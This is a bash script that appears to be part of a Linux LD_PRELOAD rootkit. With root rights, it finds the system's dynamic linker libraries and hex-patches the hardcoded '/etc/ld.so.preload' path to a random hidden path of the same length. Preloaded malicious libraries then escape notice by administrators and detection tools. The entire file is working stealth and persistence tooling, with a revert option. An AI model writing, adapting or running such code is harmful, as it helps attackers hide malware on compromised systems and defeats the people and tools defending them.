#!/bin/bash

# dirs to scan for dynamic linker libs
declare -a array LIB_DIRS=("/lib/" "/lib32/" "/libx32/" "/lib64/" \
                           "/lib/x86_64-linux-gnu/" "/lib/i386-linux-gnu/" \
                           "/lib/arm-linux-gnueabihf/")

# dirs that our new file location can live in
declare -a array PDIRS=("/bin/" "/sbin/" "/etc/" "/home/" "/lib/" "/libx32/" "/lib64/" "/opt/" "/usr/" "/var/")

declare -a array LD_LIBS=() # later stores paths of dynamic linker libraries to patch

script_root="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
source $script_root/util.sh
source $script_root/random.sh

# preload file location.
# if using this script with the -r flag, change this variable
# to wherever you would like the preload file to live.
O_PRELOAD="/etc/ld.so.preload"

[ ! -f "`bin_path xxd`" ] && { \
    eecho "xxd not found."; \
    eecho "Cannot continue..."; \
    exit; \
}

get_ld_libs(){
    local lib_dir
    for current_dir in ${LIB_DIRS[@]}; do
        [ ! -d $current_dir ] && continue
        lib_dir="${current_dir}*" # /DIRECTORY/*
        for file in ${lib_dir[@]}; do [[ "`basename $file`" == "ld-"*".so"* ]] && LD_LIBS+=($file); done
    done
}

# builds new location string for the preload file.
get_new_preload(){ echo -n "`random_path 2`.`random 'A-Za-z0-9' 8`"; }
hstr(){ local HS="`xxd -p <<< "$1"`"; echo -n "${HS::${#HS}-2}00" | awk '{print toupper($0)}'; }

patch_lib(){ # $1 = target lib, $2 = old preload file, $3 = new preload file
    [[ "`strings -a $1`" != *"$2"* ]] && return
    [ $2 == $3 ] && { necho "Skipping $1 (nothing to change)"; return; }

    local ho_preload hn_preload
    ho_preload="`hstr $2`" # hex our strings
    hn_preload="`hstr $3`"

    necho "Patching $1"
    hexdump -ve '1/1 "%.2X"' $1 | sed "s/$ho_preload/$hn_preload/g" | xxd -r -p > $1.tmp
    chmod --reference $1 $1.tmp
    mv $1.tmp $1
}

# if an optional argument is supplied to this function, it will be used
# as the path for the new preload file location... this mainly should
# be used for reverting the path back to /etc/ld.so.preload.
patch_dynamic_linker(){
    local new_preload old_preload
    old_preload="$O_PRELOAD"
    [ ! -z "$1" ] && old_preload="$1"  # allows use of -r to manually patch the current
    [ ! -z "$2" ] && new_preload="$2"  # preload file to $2
    [ ! -z "$new_preload" ] && [ -f "$new_preload" ] && rm -f "$new_preload"

    [ -z $new_preload ] && new_preload="`get_new_preload`" # generate new preload file location,
                                                           # if a path wasn't already given.

    # the new file location has got to be the same length as the previous
    while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
    while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done

    get_ld_libs # get full paths of dl libs and store in array
    for lib in ${LD_LIBS[@]}; do patch_lib $lib $old_preload $new_preload; done
    [ $OUTPUT_PATH == 1 ] && echo -n $new_preload # output the new preload file location
}

USAGE="
  Usage: $0 [ -o | -p | -r ]
         -o:
            Output the new preload file location when finished patching.
            (without a trailing newline)
         -p:
            Fully patch all dynamic linker libs on this system  (REQUIRES ROOT)
            using the randomly generated preload file path.
         -r:
            Patch the dynamic linker to \$O_PRELOAD before asking  (REQUIRES ROOT)
            for the current file path.
"

OUTPUT_PATH=0
OPTIND=1
while getopts "?oprd" opt; do
    case "$opt" in
    o)
        OUTPUT_PATH=1
        ;;
    p)
        [ $(id -u) != 0 ] && { eecho "Root is required to patch the dynamic linker libs, exiting" && exit; }

        necho "Patching the dynamic linker libraries, please wait"
        patch_dynamic_linker
        exit
        ;;
    r)
        [ $(id -u) != 0 ] && { eecho "Root is required to patch the dynamic linker libs, exiting" && exit; }

        necho "Patching preload file to '$O_PRELOAD'"
        read -p "Enter the path of the current preload file: "
        [ -z "$REPLY" ] && { echo "No path given. Exiting."; exit; }
        patch_dynamic_linker $REPLY $O_PRELOAD
        exit
        ;;
    ?)
        echo "$USAGE" && exit
    esac
done


[ -z $1 ] && echo "$USAGE"
